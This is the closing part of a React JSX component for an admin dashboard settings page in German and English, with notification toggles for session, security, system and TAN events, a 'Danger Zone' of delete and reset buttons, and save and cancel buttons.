      <div className="bg-white shadow rounded-lg">
        <div className="p-6 border-b border-gray-200">
          <div className="flex items-center">
            <Bell className="h-6 w-6 text-blue-600" />
            <h2 className="ml-3 text-lg font-medium text-gray-900">Dashboard Notifications</h2>
          </div>
          <p className="text-sm text-gray-600 mt-1">Echtzeit-Benachrichtigungen im Admin-Dashboard konfigurieren</p>
        </div>
        <div className="p-6">
          <div className="space-y-6">
            {/* Notification Types */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-3">Notification Types</label>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                  <div className="flex items-center">
                    <Users className="h-4 w-4 text-blue-600 mr-2" />
                    <span className="text-sm text-gray-700">Session Events</span>
                  </div>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={true}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>
                
                <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                  <div className="flex items-center">
                    <Shield className="h-4 w-4 text-red-600 mr-2" />
                    <span className="text-sm text-gray-700">Security Events</span>
                  </div>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={true}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>
                
                <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                  <div className="flex items-center">
                    <Server className="h-4 w-4 text-gray-600 mr-2" />
                    <span className="text-sm text-gray-700">System Events</span>
                  </div>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={true}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>
                
                <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                  <div className="flex items-center">
                    <CreditCard className="h-4 w-4 text-purple-600 mr-2" />
                    <span className="text-sm text-gray-700">TAN Events</span>
                  </div>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={true}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>
              </div>
            </div>

            {/* Notification Behavior */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-3">Notification Behavior</label>
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm text-gray-600">Auto-dismiss after 24 hours</span>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={true}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>
                
                <div className="flex items-center justify-between">
                  <span className="text-sm text-gray-600">Sound notifications</span>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={false}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>
                
                <div className="flex items-center justify-between">
                  <span className="text-sm text-gray-600">Nur kritische Benachrichtigungen anzeigen</span>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={false}
                      className="sr-only peer"
                    />
                    <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Danger Zone */}
      <div className="bg-white shadow rounded-lg border-l-4 border-red-500">
        <div className="p-6 border-b border-gray-200">
          <div className="flex items-center">
            <AlertTriangle className="h-6 w-6 text-red-600" />
            <h2 className="ml-3 text-lg font-medium text-red-900">Danger Zone</h2>
          </div>
        </div>
        <div className="p-6">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <button className="px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 text-sm">
              Alle Sessions löschen
            </button>
            <button className="px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 text-sm">
              Alle Logs löschen
            </button>
            <button className="px-4 py-2 bg-red-800 text-white rounded-md hover:bg-red-900 text-sm">
              System zurücksetzen
            </button>
          </div>
        </div>
      </div>

      {/* Save Button */}
      <div className="flex justify-end space-x-3">
        <button className="px-6 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2">
          Abbrechen
        </button>
        <button className="px-6 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2">
          Einstellungen speichern
        </button>
      </div>
    </div>
  );
};